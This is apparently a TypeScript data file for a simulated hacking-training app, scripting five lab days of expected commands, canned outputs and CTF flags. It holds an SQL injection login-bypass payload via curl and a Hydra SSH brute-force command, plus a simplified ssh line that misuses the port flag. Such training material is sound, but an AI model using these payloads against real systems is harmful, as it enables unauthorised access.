export interface LabScenario {
  id: number;
  welcomeMessage: string[];
  expectedCommands: {
    command: string;
    output: string[];
  }[];
  flag: string;
}

export const labScenarios: Record<number, LabScenario> = {
  // Day 1: Linux Basics
  1: {
    id: 1,
    welcomeMessage: [
      "Welcome to HackPath Simulated Lab - Day 1.",
      "Target IP: 10.10.10.1",
      "Goal: Execute basic linux commands to find the flag.",
      "Type 'help' for available commands."
    ],
    expectedCommands: [
      { command: "help", output: ["Available commands: help, clear, whoami, ls, cat"] },
      { command: "whoami", output: ["root"] },
      { command: "ls", output: ["flag.txt", "notes.txt"] },
      { command: "cat notes.txt", output: ["Check the other file for the flag."] },
      { command: "cat flag.txt", output: ["FLAG{linux_b4s1cs_m4st3r}"] }
    ],
    flag: "FLAG{linux_b4s1cs_m4st3r}"
  },
  
  // Day 2: Networking & Nmap
  2: {
    id: 2,
    welcomeMessage: [
      "Welcome to HackPath Simulated Lab - Day 2.",
      "Target IP: 10.10.10.2",
      "Goal: Scan the target to find the open port and retrieve the flag.",
    ],
    expectedCommands: [
      { command: "help", output: ["Available commands: help, clear, ping, nmap, curl"] },
      { command: "ping 10.10.10.2", output: ["PING 10.10.10.2: 56 data bytes", "64 bytes from 10.10.10.2: icmp_seq=1 ttl=64 time=0.043 ms"] },
      { command: "nmap 10.10.10.2", output: ["Starting Nmap...", "PORT STATE SERVICE", "8080/tcp open http-proxy"] },
      { command: "curl http://10.10.10.2", output: ["Connection refused."] },
      { command: "curl http://10.10.10.2:8080", output: ["<h1>Admin Dashboard</h1>", "<!-- FLAG{n3tw0rk_sc4nn3r} -->"] }
    ],
    flag: "FLAG{n3tw0rk_sc4nn3r}"
  },
  
  // Day 4: Directory Enumeration
  4: {
    id: 4,
    welcomeMessage: [
      "Welcome to HackPath Simulated Lab - Day 4.",
      "Target URL: http://target.com",
      "Goal: Use gobuster to find the hidden admin directory.",
    ],
    expectedCommands: [
      { command: "help", output: ["Available commands: gobuster, curl"] },
      { command: "gobuster dir -u http://target.com -w common.txt", output: [
          "===============================================================",
          "Gobuster v3.1.0",
          "===============================================================",
          "/images (Status: 301)",
          "/assets (Status: 301)",
          "/secret_admin_panel_99 (Status: 200)",
          "==============================================================="
        ] 
      },
      { command: "curl http://target.com/secret_admin_panel_99", output: ["Welcome Admin. FLAG{d1r_bust3r_w00t}"] }
    ],
    flag: "FLAG{d1r_bust3r_w00t}"
  },

  // Day 6: SQL Injection
  6: {
    id: 6,
    welcomeMessage: [
      "Welcome to HackPath Simulated Lab - Day 6.",
      "Target URL: http://target.com/login",
      "Goal: Bypass the login page using a SQL injection payload via curl.",
    ],
    expectedCommands: [
      { command: "help", output: ["Available commands: curl"] },
      { command: "curl -X POST -d 'username=admin&password=password' http://target.com/login", output: ["Invalid credentials"] },
      { command: "curl -X POST -d \"username=admin' OR 1=1 --&password=\" http://target.com/login", output: [
          "Login Successful!", 
          "Welcome to the portal. Your flag is: FLAG{sqli_byp4ss_m4st3r}"
        ] 
      }
    ],
    flag: "FLAG{sqli_byp4ss_m4st3r}"
  },
  
  // Day 9: Hydra Brute Force
  9: {
    id: 9,
    welcomeMessage: [
      "Welcome to HackPath Simulated Lab - Day 9.",
      "Target IP: 10.10.10.9",
      "Goal: Brute force the SSH login for user 'admin' using hydra.",
    ],
    expectedCommands: [
      { command: "help", output: ["Available commands: hydra, ssh"] },
      { command: "hydra -l admin -P rockyou.txt ssh://10.10.10.9", output: [
          "Hydra v9.1 (c) 2020 by van Hauser/THC",
          "...",
          "[22][ssh] host: 10.10.10.9   login: admin   password: password123",
          "1 of 1 target successfully completed, 1 valid password found"
        ] 
      },
      { command: "ssh admin@10.10.10.9", output: ["Permission denied (publickey,password)."] },
      { command: "ssh admin@10.10.10.9 -p password123", output: [ // simplified simulation of entering password
          "Welcome to Ubuntu 20.04 LTS",
          "FLAG{hydr4_brut3_f0rc3}"
        ] 
      }
    ],
    flag: "FLAG{hydr4_brut3_f0rc3}"
  }
};
